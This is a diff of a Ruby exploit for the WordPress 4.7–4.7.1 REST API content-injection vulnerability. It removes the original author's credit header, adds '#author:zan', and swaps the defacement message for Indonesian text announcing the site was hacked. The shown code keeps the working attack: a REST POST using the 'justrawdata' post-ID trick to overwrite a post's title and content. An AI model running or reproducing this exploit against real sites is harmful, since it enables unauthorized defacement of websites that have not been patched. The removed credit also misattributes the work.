@@ -1,14 +1,4 @@
-# Exploit Title: WP Content Injection
-# Date: 31 Jan' 2017
-# Exploit Author: Harsh Jaiswal
-# Vendor Homepage: http://wordpress.org
-# Version: Wordpress 4.7 - 4.7.1 (Patched in 4.7.2)
-# Tested on: Backbox ubuntu Linux
-# Based on https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
-# Credits : Marc, Sucuri, Brute
-# usage : gem install rest-client 
-# Lang : Ruby
-
+#author:zan
 
 require 'rest-client'
 require 'json'
@@ -21,8 +11,8 @@ response = RestClient.post(
   {
 
     "id" => "#{postid}justrawdata",
-    "title" => "You have been hacked",
-    "content" => "Hacked please update your wordpress version"
+    "title" => "Silahkan Update WordPress",
+    "content" => "Web ini buka kami retas cuma kami ingin memberi tau bahwa anda harus update wordpress anda (zan)"
 
 
   }.to_json,
@@ -35,6 +25,5 @@ puts "Done! '#{targeturi}/index.php?p=#{postid}'"
 
 
 else
-puts "This site is not Vulnerable"
+puts "Gak Vuln"
 end
-            
